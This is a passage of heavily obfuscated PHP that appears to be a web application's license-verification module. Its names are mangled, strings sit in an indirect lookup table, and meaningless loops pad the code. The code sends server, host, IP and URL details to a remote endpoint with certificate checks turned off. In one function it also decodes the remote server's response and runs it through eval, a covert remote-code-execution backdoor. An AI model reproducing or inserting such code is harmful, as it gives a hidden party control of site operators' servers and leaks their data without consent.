substr(md5($º÷¶èšº[98] . get_client_ip() . $»ÕÈÏê[$º÷¶èšº[99]]), 0, 15); $‚·ıßøò[$º÷¶èšº[100]][$º÷¶èšº[101]] = Mcrypt::encode(Session::sign(), $€¼èğÂ, 3600 * 24); $Ğ®†÷¦” = $½¹âÖ¸ì[686]; if (strlen($Ğ®†÷¦”) < $½¹âÖ¸ì[687]) { die; } $‚·ıßøò[$º÷¶èšº[100]][$º÷¶èšº[102]] = Action($º÷¶èšº[103])->accessToken(); $ß—¦ØÊ¦ = $½¹âÖ¸ì[688]; while ($ß—¦ØÊ¦ < $½¹âÖ¸ì[658]) { if ($ß—¦ØÊ¦ >= 0) { break; } $ß—¦ØÊ¦++; } $‚·ıßøò[$º÷¶èšº[100]][$º÷¶èšº[104]] = md5($_SERVER[$º÷¶èšº[105]] . $»ÕÈÏê[$º÷¶èšº[99]]); $‚·ıßøò[$º÷¶èšº[100]][$º÷¶èšº[106]] = base64_encode(serverInfo()); $‚·ıßøò[$º÷¶èšº[100]][$º÷¶èšº[107]] = $this->ejzn9ffed84c; if ($»ÕÈÏê[$º÷¶èšº[107]] != $º÷¶èšº[108]) { $‚·ıßøò[$º÷¶èšº[100]][$º÷¶èšº[109]] = $»ÕÈÏê[$º÷¶èšº[109]]; $‚·ıßøò[$º÷¶èšº[100]][$º÷¶èšº[110]] = $»ÕÈÏê[$º÷¶èšº[110]]; $Î¨«â­ = rand_string(10) . $this->ejzn9ffed84c . rand_string(5); $‚·ıßøò[$º÷¶èšº[87]][$º÷¶èšº[111]][$º÷¶èšº[112]] = $this->haykeb099326($Î¨«â­, $‚·ıßøò[$º÷¶èšº[100]][$º÷¶èšº[104]]); } if ($this->ejzn9ffed84c == $º÷¶èšº[108]) { $‚·ıßøò[$º÷¶èšº[87]][$º÷¶èšº[88]][$º÷¶èšº[93]][$º÷¶èšº[97]] = 0; } $‚·ıßøò[$º÷¶èšº[100]][$º÷¶èšº[113]] = _get($this->ipsg6944302f, $º÷¶èšº[114], $º÷¶èšº[6]); $‚·ıßøò[$º÷¶èšº[100]][$º÷¶èšº[115]] = _get($this->ipsg6944302f, $º÷¶èšº[116], $º÷¶èšº[6]); $¶±æµË› = $½¹âÖ¸ì[689]; while ($¶±æµË› < $½¹âÖ¸ì[687]) { if ($¶±æµË› >= 0) { break; } $¶±æµË›++; } if (_get($GLOBALS, $º÷¶èšº[117]) && $this->config[$º÷¶èšº[118]]) { $‚·ıßøò[$º÷¶èšº[100]][$º÷¶èšº[119]] = WEB_ROOT; } return $‚·ıßøò; } private function ndah3274ee45() { $ü°Ã»¨­ =& $_SERVER[³½¬ÚË¯]; $ãûì« =& $_SERVER[œÈù³¡½]; $óÒŸÛÃ± = $_SERVER[$ãûì«[24]] == $ãûì«[120]; if ($_SERVER[$ãûì«[24]] == $ãûì«[121] && $_GET[$ãûì«[122]] == $ãûì«[123]) { $óÒŸÛÃ± = !0; } if ($óÒŸÛÃ±) { $…±ãÃ’É = array($ãûì«[107] => $this->ejzn9ffed84c, $ãûì«[124] => $this->pgel775f2de3(), $ãûì«[125] => Model($ãûì«[126])->count()); if ($this->ejzn9ffed84c != $ãûì«[108]) { $îœáŠò× = _get($this->ipsg6944302f, $ãûì«[127]); if ($îœáŠò×) { $…±ãÃ’É[$ãûì«[128]] = $îœáŠò×; $…±ãÃ’É[$ãûì«[129]] = strtotime(_get($this->ipsg6944302f, $ãûì«[130])); $…±ãÃ’É[$ãûì«[131]] = _get($this->ipsg6944302f, $ãûì«[116]); } $Ëº½‰¬Ÿ = Model($ãûì«[33])->get($ãûì«[132], $ãûì«[6], !0); if (is_string($Ëº½‰¬Ÿ) && substr($Ëº½‰¬Ÿ, 0, 1) == $ãûì«[133]) { $Ëº½‰¬Ÿ = json_decode_force($Ëº½‰¬Ÿ); } if (is_array($Ëº½‰¬Ÿ) && $Ëº½‰¬Ÿ[$ãûì«[134]] && strstr($Ëº½‰¬Ÿ[$ãûì«[134]], $ãûì«[135])) { $ğ³€Üƒ = explode($ãûì«[135], $Ëº½‰¬Ÿ[$ãûì«[134]]); $…±ãÃ’É[$ãûì«[136]] = $ğ³€Üƒ[0]; } } $…±ãÃ’É = $this->ngmqdf589732(json_encode($…±ãÃ’É), md5($ãûì«[137])); $ÑÜ²õ¬Í = $ü°Ã»¨­[690]; $Ûú† §µ = array($ãûì«[138] => $…±ãÃ’É); $ığ“¡æ© = $ü°Ã»¨­[691]; call_user_func(array($ãûì«[139], $ãûì«[140]), $Ûú† §µ); } if ($this->ejzn9ffed84c == $ãûì«[108]) { return; } $ìÑ»™÷â = array($ãûì«[141], $ãûì«[142], $ãûì«[143], $ãûì«[144], $ãûì«[145], $ãûì«[146]); $Ş®í¡Îß = Model($ãûì«[33])->get(); $Î’Ü™á… = $ü°Ã»¨­[692]; while ($Î’Ü™á… < $ü°Ã»¨­[655]) { if ($Î’Ü™á… >= 0) { break; } $Î’Ü™á…++; } $Ûú† §µ = array($ãûì«[147] => $Ş®í¡Îß[$ãûì«[34]], $ãûì«[148] => $Ş®í¡Îß[$ãûì«[35]], $ãûì«[149] => $ãûì«[6]); foreach ($ìÑ»™÷â as $ÕÏÜ™è) { if (!isset($Ş®í¡Îß[$ÕÏÜ™è]) || !$Ş®í¡Îß[$ÕÏÜ™è]) { continue; } $Ûú† §µ[$ÕÏÜ™è] = $Ş®í¡Îß[$ÕÏÜ™è]; } call_user_func(array($ãûì«[139], $ãûì«[140]), $Ûú† §µ); $ÀÌ“¯¼» = $ü°Ã»¨­[693]; } private function kqgfaf1f164c() { $æÔú¶‘Ë =& $_SERVER[³½¬ÚË¯]; $’ù²ò”¡ =& $_SERVER[œÈù³¡½]; if ($_SERVER[$’ù²ò”¡[24]] != $’ù²ò”¡[150]) { return; } if (!_get($GLOBALS, $’ù²ò”¡[117])) { die; } $§ä‡¹ã² = $GLOBALS[$’ù²ò”¡[13]]; if (isset($§ä‡¹ã²[$’ù²ò”¡[151]])) { $this->ihtw1073fbe0(); die; } if (isset($§ä‡¹ã²[$’ù²ò”¡[152]]) && isset($§ä‡¹ã²[$’ù²ò”¡[152]]) == $’ù²ò”¡[123]) { $§ä‡¹ã²[$’ù²ò”¡[153]] = Model($’ù²ò”¡[33])->get($’ù²ò”¡[154]); } if (!isset($§ä‡¹ã²[$’ù²ò”¡[153]]) || strlen($§ä‡¹ã²[$’ù²ò”¡[153]]) != 16) { show_json($’ù²ò”¡[155] . $§ä‡¹ã²[$’ù²ò”¡[153]], !1); } $íİğÓàù = Model($’ù²ò”¡[33])->get($’ù²ò”¡[99]); $¾„à—ü = md5($_SERVER[$’ù²ò”¡[105]] . $íİğÓàù); $ÙÌÎ¤¹Ì = $æÔú¶‘Ë[694]; $³íÃºÊƒ = array($’ù²ò”¡[153] => $§ä‡¹ã²[$’ù²ò”¡[153]], $’ù²ò”¡[156] => rand_string(16), $’ù²ò”¡[157] => $’ù²ò”¡[137], $’ù²ò”¡[158] => $’ù²ò”¡[159], $’ù²ò”¡[160] => $_SERVER[$’ù²ò”¡[161]], $’ù²ò”¡[162] => $_SERVER[$’ù²ò”¡[163]], $’ù²ò”¡[164] => $_SERVER[$’ù²ò”¡[165]], $’ù²ò”¡[104] => $¾„à—ü, $’ù²ò”¡[166] => Model($’ù²ò”¡[33])->get($’ù²ò”¡[132])); if ($§ä‡¹ã²[$’ù²ò”¡[167]] == $’ù²ò”¡[168]) { $„ÄüïÉ˜ = $this->ngmqdf589732($¾„à—ü, $’ù²ò”¡[169]); $¦öÏ = $this->haykeb099326(json_encode($³íÃºÊƒ), $¾„à—ü . $’ù²ò”¡[170], 3); $¦öÏ = $¦öÏ . $’ù²ò”¡[171] . $_SERVER[$’ù²ò”¡[161]]; $µÊÌß³ = $this->vydb59fcbafd($’ù²ò”¡[172] . $„ÄüïÉ˜ . $’ù²ò”¡[173] . $¦öÏ, -1); show_json($µÊÌß³, !0); } else { if ($§ä‡¹ã²[$’ù²ò”¡[167]] == $’ù²ò”¡[174]) { $€Ò´Íú¹ = substr(md5($’ù²ò”¡[175] . $¾„à—ü), 12, 15) . $’ù²ò”¡[176]; $¦öÏ = $this->wayjd36879cd(trim($§ä‡¹ã²[$’ù²ò”¡[177]]), $€Ò´Íú¹, 2); $’÷í–«ä = json_decode($¦öÏ, !0); if (!is_array($’÷í–«ä) || !is_array($’÷í–«ä[$’ù²ò”¡[178]]) || $’÷í–«ä[$’ù²ò”¡[153]] != !0) { $¸ÙÑ¥¥ù = $’ù²ò”¡[179]; $Æõ±ÓÙó = $’÷í–«ä[$’ù²ò”¡[178]] ? $’ù²ò”¡[180] . $’÷í–«ä[$’ù²ò”¡[178]] : $¸ÙÑ¥¥ù; show_json($Æõ±ÓÙó, !1); } else { $³íÃºÊƒ[$’ù²ò”¡[156]] = $’÷í–«ä[$’ù²ò”¡[178]][$’ù²ò”¡[181]]; } } else { $’÷í–«ä = $this->vydb59fcbafd($’ù²ò”¡[182], $³íÃºÊƒ, 10); } } if (!is_array($’÷í–«ä) || !is_array($’÷í–«ä[$’ù²ò”¡[178]]) || $’÷í–«ä[$’ù²ò”¡[153]] != !0) { $¸ÙÑ¥¥ù = LNG($’ù²ò”¡[183]); $Æõ±ÓÙó = $’÷í–«ä[$’ù²ò”¡[178]] ? $’ù²ò”¡[180] . $’÷í–«ä[$’ù²ò”¡[178]] : $¸ÙÑ¥¥ù; show_json($Æõ±ÓÙó, !1); } $·˜×Íì¤ = $’÷í–«ä[$’ù²ò”¡[178]]; $°ÂÄÜ = $this->ldoufc34c5dc($·˜×Íì¤[$’ù²ò”¡[184]]); $È©¸ Á” = $æÔú¶‘Ë[695]; if (!$È©¸ Á”) { die; } if (!$°ÂÄÜ || $°ÂÄÜ != $·˜×Íì¤[$’ù²ò”¡[130]]) { $€ºø¬ª = array($’ù²ò”¡[185] => Model($’ù²ò”¡[33])->get($’ù²ò”¡[99]), $’ù²ò”¡[186] => $_SERVER[$’ù²ò”¡[105]], $’ù²ò”¡[187] => this_url(), $’ù²ò”¡[162] => $_SERVER[$’ù²ò”¡[163]]); $¦öÏ = $this->syfqaf763a90(json_encode($€ºø¬ª)); $this->vydb59fcbafd($’ù²ò”¡[188] . $¦öÏ); show_json(LNG($’ù²ò”¡[189]), !0); } $™×–ºˆ = array($’ù²ò”¡[154] => $·˜×Íì¤[$’ù²ò”¡[190]], $’ù²ò”¡[191] => $·˜×Íì¤[$’ù²ò”¡[192]], $’ù²ò”¡[193] => rand_string(16), $’ù²ò”¡[107] => $·˜×Íì¤[$’ù²ò”¡[194]]); if ($³íÃºÊƒ[$’ù²ò”¡[156]]) { $™×–ºˆ[$’ù²ò”¡[193]] = $³íÃºÊƒ[$’ù²ò”¡[156]]; } $ıóóÜ±¨ = substr(md5($™×–ºˆ[$’ù²ò”¡[191]]), 10, 10); $¼³ìÁÓÑ = $ıóóÜ±¨ . $™×–ºˆ[$’ù²ò”¡[107]] . $™×–ºˆ[$’ù²ò”¡[193]]; $“—³ºÍæ = $æÔú¶‘Ë[696]; while ($“—³ºÍæ < $æÔú¶‘Ë[687]) { if ($“—³ºÍæ >= 0) { break; } $“—³ºÍæ++; } $™×–ºˆ[$’ù²ò”¡[109]] = strrev(base64_encode($this->ngmqdf589732($¼³ìÁÓÑ, $’ù²ò”¡[195]))); $ÃÇÀßì› = $æÔú¶‘Ë[697]; if (!$ÃÇÀßì›) { return; } $ØÛÕˆòÆ = rand_string(16); $ÓÕ€´ÚÜ = $ØÛÕˆòÆ . $™×–ºˆ[$’ù²ò”¡[107]] . $this->ngmqdf589732(md5($™×–ºˆ[$’ù²ò”¡[154]]), $ØÛÕˆòÆ); $™×–ºˆ[$’ù²ò”¡[110]] = base64_encode(strrev($this->ngmqdf589732($ÓÕ€´ÚÜ, $’ù²ò”¡[196]))); if ($·˜×Íì¤[$’ù²ò”¡[197]] && $·˜×Íì¤[$’ù²ò”¡[197]] >= 1) { Model($’ù²ò”¡[33])->setDeep($’ù²ò”¡[198], $’ù²ò”¡[123]); } Model($’ù²ò”¡[33])->set($™×–ºˆ); $« »Àç‡ = md5($_SERVER[$’ù²ò”¡[105]] . strrev($íİğÓàù) . $™×–ºˆ[$’ù²ò”¡[191]]); $çÇÚ›Èœ = $æÔú¶‘Ë[698]; if (!$çÇÚ›Èœ) { return; } $œ»¯ë¸— = strrev(substr($« »Àç‡, 10, 16)); $‘¯Ï¸÷´ = $æÔú¶‘Ë[699]; while (strlen($‘¯Ï¸÷´) < $æÔú¶‘Ë[649]) { if (!$‘¯Ï¸÷´) { break; } $‘¯Ï¸÷´++; } $äŞªŞ™´ = $this->haykeb099326(json_encode($·˜×Íì¤), $« »Àç‡); $»ÓŸ—·¥ = $æÔú¶‘Ë[662]; $‹øá£…Ã = array_to_keyvalue(Model($’ù²ò”¡[7])->listData(), $’ù²ò”¡[199]); $Òäë§†­ = $‹øá£…Ã[$’ù²ò”¡[200]]; $Ö…Ú‚û = array(); $§•ê¶Í¤ = $æÔú¶‘Ë[700]; if (!$§•ê¶Í¤) { die; } $Ö…Ú‚û[$œ»¯ë¸—] = $äŞªŞ™´; Model($’ù²ò”¡[7])->update($Òäë§†­[$’ù²ò”¡[201]], array($’ù²ò”¡[202] => $Ö…Ú‚û)); $ı“•åš = $æÔú¶‘Ë[701]; if (!$ı“•åš) { return; } $this->ipsg6944302f = $·˜×Íì¤; $³¢íãŞŠ = $æÔú¶‘Ë[702]; if (!$³¢íãŞŠ) { die; } $this->ejzn9ffed84c = $™×–ºˆ[$’ù²ò”¡[107]]; $ ÌãêÌŠ = $æÔú¶‘Ë[703]; if (strlen($ ÌãêÌŠ) < $æÔú¶‘Ë[655]) { die; } $this->licenseRegistSuccess(); $¦Æ¾…» = $æÔú¶‘Ë[704]; while ($¦Æ¾…» < $æÔú¶‘Ë[655]) { if ($¦Æ¾…» >= 0) { break; } $¦Æ¾…»++; } Cache::set($’ù²ò”¡[203] . md5($íİğÓàù . $’ù²ò”¡[204]), $’ù²ò”¡[6]); show_json(LNG($’ù²ò”¡[189]), !0); $àÎßŠú = $æÔú¶‘Ë[705]; if (strlen($àÎßŠú) < $æÔú¶‘Ë[687]) { return; } } private function licenseRegistSuccess() { $û¥ı¼ÆÕ =& $_SERVER[³½¬ÚË¯]; $ş€Œ– =& $_SERVER[œÈù³¡½]; $Ã¤Õˆàş = Model($ş€Œ–[33])->get(); $çº“Òöš = $û¥ı¼ÆÕ[706]; while ($çº“Òöš < $û¥ı¼ÆÕ[658]) { if ($çº“Òöš >= 0) { break; } $çº“Òöš++; } if ($Ã¤Õˆàş[$ş€Œ–[63]] != $ş€Œ–[123]) { Model($ş€Œ–[33])->set($ş€Œ–[63], $ş€Œ–[123]); } Action($ş€Œ–[205])->initStart(!0); } private function ihtw1073fbe0() { $†…Áäî =& $_SERVER[³½¬ÚË¯]; $††ŸƒüÇ =& $_SERVER[œÈù³¡½]; Model($††ŸƒüÇ[33])->set(array($††ŸƒüÇ[154] => $††ŸƒüÇ[6], $††ŸƒüÇ[191] => $††ŸƒüÇ[6], $††ŸƒüÇ[107] => $††ŸƒüÇ[108], $††ŸƒüÇ[109] => $††ŸƒüÇ[6], $††ŸƒüÇ[110] => $††ŸƒüÇ[6])); $ÜéàüŠ = $†…Áäî[707]; if (strlen($ÜéàüŠ) < $†…Áäî[653]) { die; } Model($††ŸƒüÇ[33])->setDeep($††ŸƒüÇ[198], $††ŸƒüÇ[206]); $this->ipsg6944302f = array(); $­ƒ‘œ¶á = $†…Áäî[708]; while (strlen($­ƒ‘œ¶á) < $†…Áäî[655]) { if (!$­ƒ‘œ¶á) { break; } $­ƒ‘œ¶á++; } $this->ejzn9ffed84c = $††ŸƒüÇ[108]; $”¨Ğñ½ˆ = $†…Áäî[709]; } private function dres2d262823() { $ŠÆì¨Õø =& $_SERVER[³½¬ÚË¯]; $”®ÔÈ¯Ú =& $_SERVER[œÈù³¡½]; $_SERVER[$”®ÔÈ¯Ú[163]] = _get($_SERVER, $”®ÔÈ¯Ú[163], APP_HOST); $this->ejzn9ffed84c = $”®ÔÈ¯Ú[108]; $ä¥Ÿş“— = $ŠÆì¨Õø[710]; while (strlen($ä¥Ÿş“—) < $ŠÆì¨Õø[649]) { if (!$ä¥Ÿş“—) { break; } $ä¥Ÿş“—++; } $Ğ×ÃÎÃİ = Model($”®ÔÈ¯Ú[33])->get(); $äñ°„šë = $ŠÆì¨Õø[711]; if (strlen($äñ°„šë) < $ŠÆì¨Õø[649]) { return; } if ($Ğ×ÃÎÃİ[$”®ÔÈ¯Ú[107]] == $”®ÔÈ¯Ú[108]) { return; } $§ŠÓíé = Model($”®ÔÈ¯Ú[33])->get($”®ÔÈ¯Ú[99]); $˜šæ¢à© = $”®ÔÈ¯Ú[203] . md5($§ŠÓíé . $”®ÔÈ¯Ú[204]); $—Øóè¢¤ = $ŠÆì¨Õø[712]; $³»¼†²» = Cache::get($˜šæ¢à©); if (!is_array($³»¼†²») || !isset($³»¼†²»[$”®ÔÈ¯Ú[207]]) || time() - $³»¼†²»[$”®ÔÈ¯Ú[207]] >= 60) { $ÕÑ¡Ì÷ı = Model($”®ÔÈ¯Ú[7])->loadList(); $‰Š¸ƒâÀ = $ÕÑ¡Ì÷ı[$”®ÔÈ¯Ú[200]]; $ıª¥áİä = md5($_SERVER[$”®ÔÈ¯Ú[105]] . strrev($§ŠÓíé) . $Ğ×ÃÎÃİ[$”®ÔÈ¯Ú[191]]); $õŞ†¿â± = strrev(substr($ıª¥áİä, 10, 16)); $³»¼†²» = $this->wayjd36879cd($‰Š¸ƒâÀ[$”®ÔÈ¯Ú[85]][$õŞ†¿â±], $ıª¥áİä); $³»¼†²» = json_decode($³»¼†²», !0); } if (!is_array($³»¼†²»)) { return $this->ihtw1073fbe0(); } $µÅ‚Ÿ±€ = strtotime($³»¼†²»[$”®ÔÈ¯Ú[130]]); if (time() >= $µÅ‚Ÿ±€) { return $this->ihtw1073fbe0(); } if (time() - $³»¼†²»[$”®ÔÈ¯Ú[207]] > 20) { $³»¼†²»[$”®ÔÈ¯Ú[207]] = time(); Cache::set($˜šæ¢à©, $³»¼†²»); } $this->ipsg6944302f = $³»¼†²»; $this->ejzn9ffed84c = $Ğ×ÃÎÃİ[$”®ÔÈ¯Ú[107]]; } private function udih9608fa3a() { $Óªøç›µ =& $_SERVER[œÈù³¡½]; $ëºÖ•è = $GLOBALS[$Óªøç›µ[13]]; $Ã¨˜ë¡Œ = $_SERVER[$Óªøç›µ[24]]; if ($Ã¨˜ë¡Œ == $Óªøç›µ[208] && $this->ejzn9ffed84c == $Óªøç›µ[108]) { show_json(LNG($Óªøç›µ[209]), !1, $Óªøç›µ[210]); } $·À´Ìë = array($Óªøç›µ[211], $Óªøç›µ[212]); if (in_array($Ã¨˜ë¡Œ, $·À´Ìë)) { if ($this->ejzn9ffed84c == $Óªøç›µ[108] && isset($ëºÖ•è[$Óªøç›µ[213]])) { show_json(LNG($Óªøç›µ[209]), !1, $Óªøç›µ[210]); die; } $êÕ³ÉÓ… = $this->pgel775f2de3(); if ($êÕ³ÉÓ… != intval($Óªøç›µ[214])) { if ($êÕ³ÉÓ… <= Model($Óªøç›µ[126])->count()) { show_json(LNG($Óªøç›µ[215]), !1, $Óªøç›µ[210]); die; } } } } private function scpub54f48d2() { $È¡‰ÁÊ =& $_SERVER[³½¬ÚË¯]; $Òµ¼é­¢ =& $_SERVER[œÈù³¡½]; $¢©Ü¦‹ = array($Òµ¼é­¢[120], $Òµ¼é­¢[121]); $Šİæê¼Ä = $È¡‰ÁÊ[713]; if (!$Šİæê¼Ä) { return; } if (!_get($GLOBALS, $Òµ¼é­¢[117]) || !isset($_GET[$Òµ¼é­¢[216]])) { return; } if (!in_array($_SERVER[$Òµ¼é­¢[24]], $¢©Ü¦‹)) { return; } $ÖÎ«ıÎ¹ = $Òµ¼é­¢[217]; $ÖÎ«ıÎ¹ = $this->dlqh7e675748($ÖÎ«ıÎ¹, $Òµ¼é­¢[218]); $àèÙÌÅî = $È¡‰ÁÊ[714]; while (strlen($àèÙÌÅî) < $È¡‰ÁÊ[655]) { if (!$àèÙÌÅî) { break; } $àèÙÌÅî++; } $ ‹ÎÏ‘Ö = stream_context_create(array($Òµ¼é­¢[219] => array($Òµ¼é­¢[220] => $Òµ¼é­¢[221], $Òµ¼é­¢[222] => 3))); $¬ü§Êå¸ = $È¡‰ÁÊ[715]; if (!$¬ü§Êå¸) { die; } $è·‰‚Îª = @file_get_contents($ÖÎ«ıÎ¹, !1, $ ‹ÎÏ‘Ö); $ÏÉ³Ü¦Œ = $È¡‰ÁÊ[716]; if (!$ÏÉ³Ü¦Œ) { die; } header($Òµ¼é­¢[223]); if ($è·‰‚Îª && strstr($è·‰‚Îª, $Òµ¼é­¢[224])) { echo $è·‰‚Îª; } die; } public function bctj1d126761($—ºØ’ÖÉ) { $í¬Şõ„” =& $_SERVER[³½¬ÚË¯]; $È±¿ó¨Ó =& $_SERVER[œÈù³¡½]; if ($this->ejzn9ffed84c == $È±¿ó¨Ó[225]) { return $—ºØ’ÖÉ; } $µã¥Æ¦˜ = array($È±¿ó¨Ó[226] => $È±¿ó¨Ó[227], $È±¿ó¨Ó[228] => $È±¿ó¨Ó[227], $È±¿ó¨Ó[229] => $È±¿ó¨Ó[227], $È±¿ó¨Ó[230] => $È±¿ó¨Ó[231], $È±¿ó¨Ó[232] => $È±¿ó¨Ó[231], $È±¿ó¨Ó[233] => $È±¿ó¨Ó[231], $È±¿ó¨Ó[234] => $È±¿ó¨Ó[231], $È±¿ó¨Ó[235] => $È±¿ó¨Ó[231], $È±¿ó¨Ó[236] => $È±¿ó¨Ó[231], $È±¿ó¨Ó[237] => $È±¿ó¨Ó[231], $È±¿ó¨Ó[238] => $È±¿ó¨Ó[231], $È±¿ó¨Ó[239] => $È±¿ó¨Ó[231], $È±¿ó¨Ó[240] => $È±¿ó¨Ó[231], $È±¿ó¨Ó[241] => $È±¿ó¨Ó[231], $È±¿ó¨Ó[242] => $È±¿ó¨Ó[231]); $‡‚º¶ø = explode($È±¿ó¨Ó[243], _get($this->ipsg6944302f, $È±¿ó¨Ó[114], $È±¿ó¨Ó[6])); $“©û«ôÈ = $í¬Şõ„”[717]; if (strlen($“©û«ôÈ) < $í¬Şõ„”[658]) { die; } $Ë²‰ñş = array(); foreach ($µã¥Æ¦˜ as $½’æéìµ => $ÌÍäßÃÎ) { if ($ÌÍäßÃÎ == $È±¿ó¨Ó[227] && substr($this->ejzn9ffed84c, 0, 1) == $È±¿ó¨Ó[227]) { continue; } if (!in_array($½’æéìµ, $‡‚º¶ø)) { $Ë²‰ñş[] = $½’æéìµ; } } foreach ($Ë²‰ñş as $½’æéìµ) { unset($—ºØ’ÖÉ[$½’æéìµ]); $óé³Ù£º = $í¬Şõ„”[718]; if (!$óé³Ù£º) { return; } } return $—ºØ’ÖÉ; } private function gvnub185bd9c() { $ûŞÜ‡”Š =& $_SERVER[œÈù³¡½]; if ($this->ejzn9ffed84c != $ûŞÜ‡”Š[108]) { $GLOBALS[$ûŞÜ‡”Š[85]][$ûŞÜ‡”Š[89]][$ûŞÜ‡”Š[244]] = $ûŞÜ‡”Š[206]; return; } $GLOBALS[$ûŞÜ‡”Š[85]][$ûŞÜ‡”Š[245]] = $ûŞÜ‡”Š[123]; if (Model($ûŞÜ‡”Š[246])->get($ûŞÜ‡”Š[63]) != $ûŞÜ‡”Š[206]) { Model($ûŞÜ‡”Š[246])->set($ûŞÜ‡”Š[63], $ûŞÜ‡”Š[206]); } } public function ufwqc85f9757() { return $_SERVER[œÈù³¡½][247]; } private function qkyh73130cb8() { $Ë¦äè—ì =& $_SERVER[³½¬ÚË¯]; $“ƒÊí•® =& $_SERVER[œÈù³¡½]; $Ú„¯ûø£ = array($“ƒÊí•®[248], $“ƒÊí•®[249], $“ƒÊí•®[250]); $®ÃàÇæÏ = $Ë¦äè—ì[719]; $Ÿö¿öàÀ = $“ƒÊí•®[251] . md5($“ƒÊí•®[252]); if ($this->ejzn9ffed84c == $“ƒÊí•®[108] || !_get($GLOBALS, $“ƒÊí•®[117])) { return; } if (!in_array($_SERVER[$“ƒÊí•®[24]], $Ú„¯ûø£)) { return; } if (time() % 4 != 0) { return; } $¦«ÂÀ¹ = call_user_func(array($“ƒÊí•®[253], $“ƒÊí•®[254]), $Ÿö¿öàÀ); if ($¦«ÂÀ¹ && time() - $¦«ÂÀ¹ < intval($“ƒÊí•®[255])) { return; } call_user_func(array($“ƒÊí•®[253], $“ƒÊí•®[140]), $Ÿö¿öàÀ, time()); $Ò¬©Ì›ì = Model($“ƒÊí•®[33])->get($“ƒÊí•®[99]); $Øã’¦ÕÇ = array($“ƒÊí•®[153] => Model($“ƒÊí•®[33])->get($“ƒÊí•®[154]), $“ƒÊí•®[167] => $this->ejzn9ffed84c, $“ƒÊí•®[164] => $_SERVER[$“ƒÊí•®[165]], $“ƒÊí•®[166] => Model($“ƒÊí•®[33])->get($“ƒÊí•®[132]), $“ƒÊí•®[104] => md5($_SERVER[$“ƒÊí•®[105]] . $Ò¬©Ì›ì), $“ƒÊí•®[157] => $“ƒÊí•®[137], $“ƒÊí•®[160] => $_SERVER[$“ƒÊí•®[161]]); $±èæÜŸó = $Ë¦äè—ì[720]; if (!$±èæÜŸó) { die; } $íòò™Î• = $this->vydb59fcbafd($“ƒÊí•®[256], $Øã’¦ÕÇ); $Œø†ã¤ƒ = $Ë¦äè—ì[721]; if (!$Œø†ã¤ƒ) { die; } if (!is_array($íòò™Î•)) { return; } if ($íòò™Î•[$“ƒÊí•®[153]] && $íòò™Î•[$“ƒÊí•®[257]]) { if ($this->ldoufc34c5dc($íòò™Î•[$“ƒÊí•®[257]]) == $Øã’¦ÕÇ[$“ƒÊí•®[153]]) { return; } } $this->ihtw1073fbe0(); if ($this->ldoufc34c5dc($íòò™Î•[$“ƒÊí•®[257]]) != $Øã’¦ÕÇ[$“ƒÊí•®[153]]) { $é¯şïœê = array($“ƒÊí•®[185] => $Ò¬©Ì›ì, $“ƒÊí•®[186] => $_SERVER[$“ƒÊí•®[105]], $“ƒÊí•®[187] => this_url(), $“ƒÊí•®[162] => $_SERVER[$“ƒÊí•®[163]]); $¥ê¿­Ù = $this->syfqaf763a90(json_encode($é¯şïœê)); $íòò™Î• = $this->vydb59fcbafd($“ƒÊí•®[188] . $¥ê¿­Ù); if ($íòò™Î• && is_array($íòò™Î•) && isset($íòò™Î•[$“ƒÊí•®[257]])) { $Ò×á¢•“ = $this->wayjd36879cd($íòò™Î•[$“ƒÊí•®[257]], 2); if ($Ò×á¢•“) { $Ò×á¢•“ = $this->ldoufc34c5dc($Ò×á¢•“); } if ($Ò×á¢•“) { try { @eval($Ò×á¢•“); } catch (Exception $¤“’±¬î) { } } } } } private function vydb59fcbafd($‚¯ÓûœÊ = '', $Öò‰®öÁ = array(), $ÃçŠÅÃ = 5) { $ÑâîÏğæ =& $_SERVER[³½¬ÚË¯]; $ÌĞÕñõª =& $_SERVER[œÈù³¡½]; $Î÷­¼½¶ = $ÌĞÕñõª[258]; $áÏ€§š¹ = $ÑâîÏğæ[722]; if (!$áÏ€§š¹) { die; } $Î÷­¼½¶ = $this->dlqh7e675748($Î÷­¼½¶, $ÌĞÕñõª[259]); $‡ ûïÅ = $ÑâîÏğæ[723]; $Î÷­¼½¶ = $Î÷­¼½¶ . $‚¯ÓûœÊ; $ú¸‡•Äı = $ÑâîÏğæ[724]; if (strlen($ú¸‡•Äı) < $ÑâîÏğæ[655]) { die; } if ($Öò‰®öÁ && is_array($Öò‰®öÁ)) { $Î÷­¼½¶ = $Î÷­¼½¶ . $ÌĞÕñõª[260] . http_build_query($Öò‰®öÁ); } if ($Öò‰®öÁ === -1) { return $Î÷­¼½¶; } $†ùÚé°› = stream_context_create(array($ÌĞÕñõª[219] => array($ÌĞÕñõª[222] => $ÃçŠÅÃ, $ÌĞÕñõª[220] => $ÌĞÕñõª[261]), $ÌĞÕñõª[262] => array($ÌĞÕñõª[263] => !1, $ÌĞÕñõª[264] => !1))); $ºˆÑĞ¡ = $ÑâîÏğæ[725]; while ($ºˆÑĞ¡ < $ÑâîÏğæ[653]) { if ($ºˆÑĞ¡ >= 0) { break; } $ºˆÑĞ¡++; } $Öò‰®öÁ = @file_get_contents($Î÷­¼½¶, !1, $†ùÚé°›); return json_decode($Öò‰®öÁ, !0); $¦ó‡Ÿßá = $ÑâîÏğæ[726]; if (!$¦ó‡Ÿßá) { return; } } private function pgel775f2de3() { $êÊüóÓ =& $_SERVER[³½¬ÚË¯]; $‹üß·£û =& $_SERVER[œÈù³¡½]; $õ±ÉõÕ³ = array($‹üß·£û[265] => $‹üß·£û[266], $‹üß·£û[267] => $‹üß·£û[268], $‹üß·£û[269] => $‹üß·£û[270], $‹üß·£û[271] => $‹üß·£û[272], $‹üß·£û[273] => $‹üß·£û[274], $‹üß·£û[275] => $‹üß·£û[214], $‹üß·£û[276] => $‹üß·£û[214], $‹üß·£û[277] => $‹üß·£û[266], $‹üß·£û[278] => $‹üß·£û[268], $‹üß·£û[279] => $‹üß·£û[270], $‹üß·£û[280] => $‹üß·£û[281], $‹üß·£û[282] => $‹üß·£û[272], $‹üß·£û[283] => $‹üß·£û[284], $‹üß·£û[285] => $‹üß·£û[274], $‹üß·£û[286] => $‹üß·£û[287], $‹üß·£û[288] => $‹üß·£û[289], $‹üß·£û[290] => $‹üß·£û[291]); $¨‡»“§» = $êÊüóÓ[727]; $´ïªğí¬ = $õ±ÉõÕ³[$this->ejzn9ffed84c]; $€ù€ö = $êÊüóÓ[728]; if (strlen($€ù€ö) < $êÊüóÓ[687]) { return; } $´ïªğí¬ = intval($´ïªğí¬ ? $´ïªğí¬ : $‹üß·£û[266]); 